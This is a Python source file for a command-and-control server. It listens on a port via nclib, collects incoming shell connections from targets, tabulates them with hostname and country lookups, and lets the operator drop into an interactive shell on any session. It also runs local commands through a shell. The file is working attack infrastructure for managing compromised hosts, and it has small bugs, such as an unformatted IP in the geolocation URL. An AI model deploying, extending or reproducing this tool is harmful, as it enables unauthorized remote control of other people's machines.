#!/usr/bin/python3
#-*- coding:utf-8 -*-

import sys
import socket
import threading
import time
import os
import platform
import json
import logging
import readline
import subprocess
import shlex
from getpass import getuser

try:
    from tabulate import tabulate
except ImportError:
    print("[!] Error Tabulate Not Found !")
    sys.exit(1)

try:
    from datetime import datetime
except ImportError:
    print("[!] Error Datetime Not Found !")
    sys.exit(1)

try:
    import nclib
except ImportError:
    print("[!] Error Nclib Not Found !")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] Error Requests Not Found !")
    sys.exit(1)


global id_vector
global socket_fd_vector
global nc
id_vector = []
connection = []
socket_fd_list = []
hostname_ls = []

class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            if text:
                self.matches = [s
                                for s in self.options
                                if s and s.startswith(text)]
                logging.debug('%s matches: %s', repr(text), self.matches)
            else:
                self.matches = self.options[:]
                logging.debug('(empty input) matches: %s', self.matches)
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        logging.debug('complete(%s, %s) => %s',repr(text), state, repr(response))
        return response

class C2C_Server:

    def __init__(self):
        pl = self.check_platform()
        
        if pl == 0:
            print("[!] Error : GNU/Linux Required !")
            sys.exit(1)

    def check_platform(self):
        if 'Linux' not in platform.platform():
            return 0
        else:
            return 1
    
    def clear(self):
        os.system("clear")
    
    def thread_listen_new_connection(self,host,port):
        try:
            p = int(port)
            t = threading.Thread(target=self.listen_connection,args=(host,p))
            t.start()
        except Exception as error_thread:
            return error_thread
    
    def listen_connection(self,host,port):
        i = 0
        print("\033[38;5;85m[\033[34m+\033[38;5;85m] Monitoring on \033[38;5;196m%s\033[38;5;85m:\033[38;5;196m%s\033[00m" % (host,port))
        while True:
            try:
                nc = nclib.Netcat(listen=(host,port))
                id_vector.append(nc)
                connection.append(nc.peer)
                print("\033[38;5;85m[\033[34m+\033[38;5;85m] New Connection from \033[38;5;196m%s:%s\033[00m" % (nc.peer[0],nc.peer[1]))
                i = i+1
            except Exception as error_listen:
                return error_listen.message
    

    def execute_local_command(self,command):
        try:
            cmd = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out_stdout_stderr = cmd.stdout.read() + cmd.stderr.read()
            return out_stdout_stderr
        except Exception as error_execute_command:
            return error_execute_command
    

    def show_help(self):
        try:
            print("\t\tHelp Commands")
            h = [["Commands","Descriptions","Usage"],["help","Show This","help or ?"],["exit","Exit C2C Server","exit"],["quit","Exit","quit"],["!","Execute Local Command","!<command>"],["clear","Clear Console","clear or cls"],["banner",'Show Banner','banner'],["shell","interact with id session","shell <id>"],["listen","listen port","listen <ip> <port>"],["sessions","show sessions","sessions"]]
            print(tabulate(h,tablefmt="fancy_grid"))
        except:
            print("[!] Error Show Help !")
    
    def interact_session(self,s):
        try:
            s.send('\n'.encode("utf-8"))
            s.interact()
        except KeyboardInterrupt:
            print("[*] Error : Failed Interact Session !")
    

    def list_connection(self):
        i = 0
        entry_table = []
        headers = ["ID","Target IP","Target Port","Hostname","Country"]
        for id_c in id_vector:
            for con in connection:
                hostname = self.get_hostname(con[0])
                info = self.get_country(con[0])
                #print("\033[38;5;85m[\033[34m%d\033[38;5;85m] Target : %s | Port : %s\033[00m" % (i,con[0],con[1]))
                entry_table.append([i,con[0],con[1],hostname,info[0]])
                i = i + 1
        
        print(tabulate(entry_table,headers=headers,tablefmt="fancy_grid"))
    

    def get_hostname(self,ip_or_domain):
        try:
            s = socket.gethostbyaddr(ip_or_domain)[0]
            return s
        except:
            return "Unknown"
    
    def get_country(self,ip):
        tab = []
        try:
            r = requests.get("https://ipinfo.io/%s/geo")
            content = r.text
            obj = json.loads(content)
            country = obj["country"]
            tab.append(country)
            return tab
        except:
            rr = requests.get("https://ipinfo.io/geo")
            obj = json.loads(rr.text)
            tab.append(obj["country"])
            return tab
    

    def get_username(self):
        try:
            username = getuser()
            return username
        except:
            return "Unknown"
